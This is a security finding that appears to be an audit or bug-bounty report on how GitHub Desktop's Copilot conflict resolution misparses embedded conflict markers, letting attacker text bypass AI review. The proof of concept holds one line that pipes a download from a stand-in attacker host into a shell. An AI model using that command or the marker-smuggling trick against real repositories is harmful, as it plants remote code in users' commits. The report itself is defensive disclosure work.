### Title
Conflict-marker "first match wins" parsing lets attacker-controlled merge/PR content smuggle unreviewed text into AI-resolved commits - (File: `app/src/lib/copilot-conflict-context.ts`, `app/src/lib/copilot-conflict-resolution.ts`)

### Summary
GitHub Desktop's Copilot-assisted conflict resolution feature extracts conflict hunks from a working-directory file (`extractConflictHunks`) and later splices the model's per-hunk resolutions back into that same raw content (`reassembleResolvedFile`). Both functions independently re-scan the file for `<<<<<<<` / `=======` / `>>>>>>>` marker lines and both close a hunk on the *first* line that looks like a closing marker. If either side of a real git conflict (`ours` or `theirs`) contains attacker-authored text that itself matches the marker regexes — plausible in documentation, tutorials, patch/diff fixtures, or CI-generated files that legitimately contain example conflict markers — the hunk boundary is detected too early. Content that lies between the counterfeit `>>>>>>>`-looking line and the true one is then treated as ordinary, non-conflicted file content and copied through **verbatim, unseen by the AI and unflagged to the user**, ending up in the final commit exactly as the attacker wrote it.

### Finding Description
`extractConflictHunks` walks the file line-by-line and, once it sees an "ours" marker, collects lines until it hits a base/separator marker, then collects "theirs" lines until it hits the closing marker: [1](#0-0) 

`reassembleResolvedFile` performs an independent second pass over the *same raw content*, using its own copies of the marker regexes, and likewise stops at the first line that satisfies the "theirs" closing pattern: [2](#0-1) [3](#0-2) 

The design explicitly documents that hunks are "matched by order, not by line number": [4](#0-3) 

This is safe only if both parsers see the conflict block boundaries identically to a human/`git`. But because both simply key off literal 7-character marker runs, any attacker-controlled content on either side of the merge that contains a line beginning with 7 `>` characters (a very natural thing to appear in commit history describing conflict resolution, e.g. a README/tutorial about git, a fixture file used for testing merge tooling, or a copy-pasted patch snippet) will be misinterpreted as the *real* closing marker for the current hunk. Everything after that counterfeit marker, up to the real `>>>>>>>` line, is then classified by both functions as "regular file content" (`contextAfter` in extraction; simple pass-through lines in reassembly) rather than as part of the conflict — so it is never sent to the model for review and is copied unchanged into the final resolved file that gets written to disk and staged: [5](#0-4) 

The existing guards do not stop this path:
- `resolveWithin(repository.path, resolution.path)` only validates that the *target file path* stays inside the repo — it says nothing about the *content* being spliced into that file.
- `validateResolutionPaths` only checks that the returned hunk *count* matches the count `extractConflictHunks` computed — since both extraction and reassembly are wrong in the same way (same first-match logic), the counts still line up, so this validation passes even though the boundaries are wrong.
- The "still contains conflict markers" check in `parseCopilotConflictResolution` only inspects the model's own `resolvedContent`, not the raw file being spliced.

### Impact Explanation
An attacker who controls a branch, pull request, or fork that the victim merges/rebases/cherry-picks against (i.e., "attacker controls a cloned/fetched repository") can craft file content so that a genuine merge conflict on that file causes GitHub Desktop's Copilot resolution flow to silently include attacker-chosen text into the committed/pushed result — without that text ever appearing in the model's `resolvedContent` and without being flagged as part of the conflict. This is a direct instance of "silent corruption of what the user commits or pushes": the user believes they are committing content that was AI-reviewed and reconciled, but a portion of the file is actually raw attacker content copied through unexamined. Because the corrupted region masquerades as ordinary (non-conflicted) file content, it will still show up in the file diff, but reviewers evaluating an AI-assisted conflict resolution are primed to trust context lines as "unchanged/uninteresting," making a maliciously inserted marker-mimicking block easy to overlook.

### Likelihood Explanation
Exploitation requires only that the attacker control one side of a mergeable branch/PR containing a line that happens to start with 7 `>` (or, to affect the "ours" collection path, 7 `<`/`=`) characters — no local access, no elevated privileges, and no unnatural user interaction beyond the normal act of merging/rebasing a branch and clicking "Resolve with Copilot" → "Continue Merge," which are core, expected Desktop workflows. This is a realistic content pattern (git tutorials, test fixtures, embedded patch text) rather than a contrived edge case, so likelihood is not negligible, though it does depend on the victim choosing to use the Copilot conflict-resolution feature on the affected file.

### Recommendation
Make the two parsers marker-boundary aware of each other and robust to nested/embedded marker-like text:
- Require exact whole-line matches anchored to the specific conflict-marker grammar produced by git for the current merge (including label text after `<<<<<<<`/`>>>>>>>`), and reject/flag hunks where nested marker-like lines are found inside the collected ours/theirs/base sections instead of silently treating them as the real boundary.
- Have `reassembleResolvedFile` re-derive its hunk boundaries from the same trusted extraction result used to build the prompt (e.g., pass hunk start/end line indices from `extractConflictHunks` instead of independently re-scanning raw text), removing the two-parser divergence entirely.
- When embedded marker-like content is detected within a hunk, skip the file from automatic Copilot resolution (as already done for other "skipped" cases) and force manual review, rather than silently splicing.

### Proof of Concept
1. Attacker pushes a branch `feature` where a file `notes.md` (which will conflict with the victim's `main`) contains, inside the section that differs from `main`, a line that is not a real conflict but looks like one, e.g.:
   ```
   Example of a resolved conflict marker set:
   >>>>>>> some-other-branch
   INJECTED: curl http://evil.example/x | sh
   ```
2. Victim runs a normal merge/rebase in Desktop; `notes.md` gets real `<<<<<<<`/`=======`/`>>>>>>>` markers from git wrapping both sides' content (including the attacker's fake `>>>>>>> some-other-branch` line inside "theirs").
3. `extractConflictHunks` walks the "theirs" section and stops collecting at the attacker's fake `>>>>>>>` line rather than the real closing marker, per `app/src/lib/copilot-conflict-context.ts:228-242`. The AI never sees `INJECTED: curl ... | sh` as part of the conflict.
4. `reassembleResolvedFile` performs the same first-match closing logic, per `app/src/lib/copilot-conflict-resolution.ts:559-591`, so the line `INJECTED: curl http://evil.example/x | sh` (and everything up to the true closing marker) is copied through untouched as ordinary file content.
5. `_applyCopilotConflictResolutions` writes this reassembled content to disk and stages it, per `app/src/lib/stores/app-store.ts:7233-7259`, without the injected line ever having been reviewed by Copilot or explicitly called out as part of the conflict resolution.

Because I was not able to execute the app in this session, this proof of concept is derived purely from tracing the parsing/reassembly logic in the cited files; I was unable to confirm at runtime whether the diff/UI review step would visually distinguish the injected block from genuine unchanged context, which would affect how easily a user might notice it before committing.
